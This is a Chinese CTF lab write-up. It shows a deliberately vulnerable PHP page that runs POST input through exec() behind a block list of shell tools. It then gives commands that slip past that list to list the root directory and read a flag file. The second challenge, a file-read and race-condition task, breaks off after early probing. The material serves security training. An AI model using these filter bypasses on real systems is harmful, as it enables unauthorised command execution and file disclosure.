# CTF 第二天

## notrce（无回显命令执行）

题目：

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$c=$_POST['c'];
if(!preg_match("/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|>|<|`|\*|\\$|\\\/i",$c)){
    exec($c);
}else{
    die("hacker");
}
```

过滤了这些命令：

`vi` `less` `tail` `head` `od` `sh` `echo` `touch` `re` `mv` `rm` `cat` `ls` `tac` `more` `cut` `curl` `wget` `base`

以及这些符号：

`>` `<` `` ` `` `*` `$` `\`

`exec` 执行无回显。用 `tee` 把结果写进文本：

```bash
vidr|tee 1.txt
```

![image-20230428125330260](image-20230428125330260.png)

当前目录没有 flag。从根目录列文件：

```bash
du -ah /|tee 1.txt
```

`Ctrl+F` 搜 `flag`。

![image-20230428130655604](image-20230428130655604.png)

找到后再读出来：

```bash
nl /flag | tee 1.txt
```

![image-20230428130752959](image-20230428130752959.png)

## 完美网站（条件竞争）

访问会一直重定向到：

```http
xxxxxxxx/?img=dHVwaWFuLnBuZw==
```

`img` 的值解出来是 `tupian.png`，判断它是读文件。直接访问会提示 `n` 没被定义。

![image-20230428142440565](image-20230428142440565.png)

加上参数 `n`：

```http
GET /?img=dHVwaWFuLnBuZw==&n=1
```

![image-20230428142501955](image-20230428142501955.png)

提示：

![image-20230428142525171](image-20230428142525171.png)

说 `n` 要在 20 以内，但跟 `n` 的值其实没啥关系。
